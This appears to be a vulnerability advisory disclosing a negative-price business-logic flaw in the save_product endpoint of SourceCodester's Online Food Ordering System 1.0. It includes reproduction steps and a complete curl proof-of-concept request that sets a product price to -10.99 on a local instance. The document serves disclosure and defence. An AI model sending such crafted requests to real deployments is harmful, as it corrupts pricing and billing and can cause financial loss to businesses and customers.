# Business Logic Flaw (Negative Product Price) in Online Food Ordering System

## Overview

* **Vulnerability Type**: Business Logic Error / Improper Input Validation
* **Vendor**: SourceCodester
* **Product**: [Online Food Ordering System](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
* **Version**: 1.0
* **Component**: Product Management (`Actions.php?a=save_product`)
* **Vulnerable Parameter**: `price`

## Description

A Business Logic vulnerability exists in **Online Food Ordering System v1.0** due to the lack of proper server-side input validation.

The application allows administrators to add or update food products. However, the `Actions.php` backend script fails to validate that the `price` parameter must be a positive number. An attacker (or a malicious administrator) can send a crafted HTTP POST request to set a product's price to a negative value (e.g., `-10.99`).

This flaw corrupts the financial logic of the application. If a customer were to purchase this item, it could potentially deduct the amount from their total bill rather than adding to it, leading to financial discrepancies and billing errors.

## Steps to Reproduce

1. **Setup**: Deploy the Online Food Ordering System locally.
2. **Login**: Log in to the application as an administrator.
3. **Prepare Payload**: Construct a POST request to `Actions.php?a=save_product`.
4. **Exploit**: Send the request with the `price` field set to a negative number (e.g., `-10.99`).
5. **Verify**: Navigate to the Product List page (`/admin/?page=products`). The new product will be listed with the negative price, confirming the database accepted the invalid business data.

## PoC Command

The following `curl` command demonstrates how to bypass validation and create a product with a price of **-10.99**:

```bash
curl --compressed -s -i -X POST 'http://127.0.0.1:8088/Actions.php?a=save_product' \
-H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTest123' \
-H 'X-Requested-With: XMLHttpRequest' \
--data-binary $'------WebKitFormBoundaryTest123\r\nContent-Disposition: form-data; name="id"\r\n\r\n\r\n------WebKitFormBoundaryTest123\r\nContent-Disposition: form-data; name="name"\r\n\r\nTest Product Negative Price\r\n------WebKitFormBoundaryTest123\r\nContent-Disposition: form-data; name="description"\r\n\r\nTest Description\r\n------WebKitFormBoundaryTest123\r\nContent-Disposition: form-data; name="category_id"\r\n\r\n2\r\n------WebKitFormBoundaryTest123\r\nContent-Disposition: form-data; name="price"\r\n\r\n-10.99\r\n------WebKitFormBoundaryTest123\r\nContent-Disposition: form-data; name="thumbnail"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryTest123\r\nContent-Disposition: form-data; name="img[]"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryTest123\r\nContent-Disposition: form-data; name="status"\r\n\r\n1\r\n------WebKitFormBoundaryTest123--\r\n'

```

## Proof of Concept

The screenshot below confirms that the product has been successfully saved to the system with a price of **-10.99**.

<img width="1091" height="395" alt="f7d3ce2af32b0edd05d3e6f49ca22516" src="https://github.com/user-attachments/assets/3f121a4f-f9e1-4975-85ce-01a8b3a9d954" />


## Impact

This vulnerability allows the integrity of the system's pricing model to be compromised:

1. **Financial Logic Corruption**: Orders containing this product will have incorrect totals (subtracting value instead of adding it).
2. **Billing Errors**: This can lead to negative invoices or "free money" scenarios if checkout logic does not handle negative subtotals.
3. **Database Inconsistency**: Storing invalid business data violates the expected constraints of an e-commerce database.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
